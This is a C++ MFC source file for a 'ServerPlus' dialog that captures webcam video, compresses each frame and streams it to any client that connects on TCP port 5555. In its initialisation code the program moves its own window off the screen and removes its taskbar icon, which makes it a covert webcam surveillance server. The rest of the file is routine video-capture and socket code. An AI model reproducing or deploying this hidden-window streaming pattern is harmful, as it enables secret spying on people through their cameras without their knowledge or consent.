//Download by http://www.NewXing.com
// ServerPlusDlg.cpp : implementation file
//

#include "stdafx.h"
#include "ServerPlus.h"
#include "ServerPlusDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CServerPlusDlg dialog

CServerPlusDlg::CServerPlusDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CServerPlusDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CServerPlusDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CServerPlusDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CServerPlusDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CServerPlusDlg, CDialog)
	//{{AFX_MSG_MAP(CServerPlusDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_DESTROY()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CServerPlusDlg message handlers

BOOL CServerPlusDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	RECT rect;
	GetClientRect(&rect);
	//把窗口移动到屏幕外
	MoveWindow(1024-rect.right,-500,rect.right,rect.bottom);
	//隐藏任务栏图标
	ModifyStyleEx(WS_EX_APPWINDOW,WS_EX_TOOLWINDOW);

	// TODO: Add extra initialization here
	this->m_bConnect=FALSE;//未连接
	this->m_SampleNum=0;//初始化采集帧
	this->FillBitmapStruct();
	this->InitVideoCard();
	this->InitCompressor();
	this->InitNetWork();
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CServerPlusDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CServerPlusDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CServerPlusDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}
//使编码器无效
void CServerPlusDlg::UnInitCompressor()
{
	//编码器有效
	if (m_CV.hic!=NULL)
	{
		//删除输出格式
		delete[] m_pOutInfo;

		//结束编码
		::ICSeqCompressFrameEnd(&m_CV);

		//释放COMPVARS结构资源
		ICCompressorFree(&m_CV);

		//关闭编码器
		ICClose(m_CV.hic);
	}
}
//初始化编码器
void CServerPlusDlg::InitCompressor()
{	
	//初始化m_CV
    memset(&m_CV,0,sizeof(COMPVARS));

	//设置COMPVARS结构
	//手工设置COMPVARS结构
	m_CV.dwFlags=ICMF_COMPVARS_VALID;
	//COMPVARS结构大小
	m_CV.cbSize=sizeof(m_CV);
	//使用divx编码器
	m_CV.fccHandler=mmioFOURCC('m','s','v','c');
	//编码器类型
	m_CV.fccType=ICTYPE_VIDEO;
	//打开编码器,hic为编码器句柄
	m_CV.hic=ICOpen(ICTYPE_VIDEO,mmioFOURCC('m','s','v','c'),ICMODE_COMPRESS);
	//数据速率(kb/s)
	m_CV.lDataRate=780;
	//关键帧率
	m_CV.lKey=15;
	//默认质量设置
	m_CV.lQ=ICQUALITY_DEFAULT;
	//保留字段
	m_CV.lKeyCount=0;
	m_CV.lpbiIn=NULL;
	m_CV.lpBitsOut=NULL;
	m_CV.lpBitsPrev=NULL;
	m_CV.lpState=NULL;
	m_CV.cbState=0;
	m_CV.lFrame=0;

	//编码器打开成功
	if (m_CV.hic!=NULL)
	{
		//编码器输出格式大小
		m_OutFormatSize=ICCompressGetFormatSize(m_CV.hic,&m_InInfo);

		//编码器输出格式
	    m_pOutInfo=(BITMAPINFO *)new BYTE[m_OutFormatSize];
	    ICCompressGetFormat(m_CV.hic,&m_InInfo,m_pOutInfo);

		//编码器输出缓存大小
		m_OutBufferSize=ICCompressGetSize(m_CV.hic,&m_InInfo,m_pOutInfo);
		
		//初始化资源，为编码帧序列做好准备
		ICSeqCompressFrameStart(&m_CV,&m_InInfo);
	}
	else
	{
		//提示
		MessageBox("系统视频压缩方式不支持!");
	}
}

void CServerPlusDlg::OnDestroy() 
{
	CDialog::OnDestroy();
	
	// TODO: Add your message handler code here
	this->UnInitCompressor();
	this->UnInitVideoCard();
	
}

//初始化视频采集设备
void CServerPlusDlg::InitVideoCard()
{
	//创建视频捕获窗口
	this->m_hWndCapture=::capCreateCaptureWindow("Capture Window",
		WS_VISIBLE|WS_CHILD,0,0,320,240,this->m_hWnd,1);

	//关联到第1个采集设备
	capDriverConnect(this->m_hWndCapture,0);

	//设置视频格式 
	capSetVideoFormat(this->m_hWndCapture,
		&this->m_InInfo,sizeof(BITMAPINFO));

	//设置预览模式(preview mode)的显示速率
	capPreviewRate(this->m_hWndCapture,40);

	//设置预览模式
	capPreview(this->m_hWndCapture,TRUE);

	//设置帧采集回调函数
	capSetCallbackOnFrame(this->m_hWndCapture,FrameCallBack);
}

//使采集设备无效
void CServerPlusDlg::UnInitVideoCard()
{
	//置帧采集回调函数无效
	capSetCallbackOnFrame(this->m_hWndCapture,FrameCallBack);

	//断开与设备的关联
	capDriverDisconnect(this->m_hWndCapture);
}

//帧采集回调函数
//采集到一帧数据时就调用该函数
LRESULT CALLBACK CServerPlusDlg::FrameCallBack(HWND hWnd, LPVIDEOHDR lpVHdr)
{ 
	//获取主窗口
	CServerPlusDlg* pDlg=(CServerPlusDlg*)::AfxGetMainWnd();

	//处于连接状态
	if (pDlg->m_bConnect==TRUE)
	{
		//编码并发送
		pDlg->CompressFrame(lpVHdr);
	}

	//返回
	return TRUE;
}

//编码压缩并发送
void CServerPlusDlg::CompressFrame(LPVIDEOHDR lpVHdr)
{
	//是否为关键帧
	BOOL bKeyFrame;

	//视频帧实际大小
	m_OutActSize=this->m_InInfo.bmiHeader.biSizeImage;

	//编码压缩
	BYTE* Buf=(BYTE*)ICSeqCompressFrame(&m_CV,0,
		lpVHdr->lpData,&bKeyFrame,(long*)&m_OutActSize);

	//处于连接状态，并且视频数据大小合适
	if (this->m_bConnect==TRUE && m_OutActSize<MAPBUFSIZE)
	{
		//视频数据
		VIDEO_DATA VideoData;

		//初始化
		memset(&VideoData,0,sizeof(VIDEO_DATA));

		//标记是否为关键帧
		VideoData.bKeyFrame=bKeyFrame;

		//复制视频(裸)数据
		memcpy(VideoData.Buf,Buf,m_OutActSize);

		//复制视频帧序号
		VideoData.nSampleNum=this->m_SampleNum;

		//编码器输出实际大小
		VideoData.nUsedSize=m_OutActSize;

		//发送完整的视频帧数据
		this->m_ServerStreamSock.Send(&VideoData,sizeof(VIDEO_DATA));

		//更新视频帧序号
		m_SampleNum+=1;
	}
}

//设置位图的BITMAPINFOHEADER结构
void CServerPlusDlg::FillBitmapStruct()
{
	//每个像素的比特数
	m_InInfo.bmiHeader.biBitCount=24;
	//所有颜色对显示位图同等重要
	m_InInfo.bmiHeader.biClrImportant=0;
	//位图实际使用的颜色(使用所有颜色)
	m_InInfo.bmiHeader.biClrUsed=0;
	//压缩类型
	m_InInfo.bmiHeader.biCompression=BI_RGB;
	//目标设备平面数
	m_InInfo.bmiHeader.biPlanes=1;
	//BITMAPINFOHEADER结构大小
	m_InInfo.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
	//未压缩的RGB位图
	m_InInfo.bmiHeader.biSizeImage=0;
	//位图高
	m_InInfo.bmiHeader.biHeight=240;
	//位图宽
	m_InInfo.bmiHeader.biWidth=320;
	//X方向分辨率
	m_InInfo.bmiHeader.biXPelsPerMeter=0;
	//Y方向分辨率
	m_InInfo.bmiHeader.biYPelsPerMeter=0;
}

//初始化网络
void CServerPlusDlg::InitNetWork()
{
	//初始化
	::AfxSocketInit();

	//创建socket
	m_ListenSock.Create(5555,SOCK_STREAM,FD_ACCEPT);

	//侦听
	m_ListenSock.Listen();
}
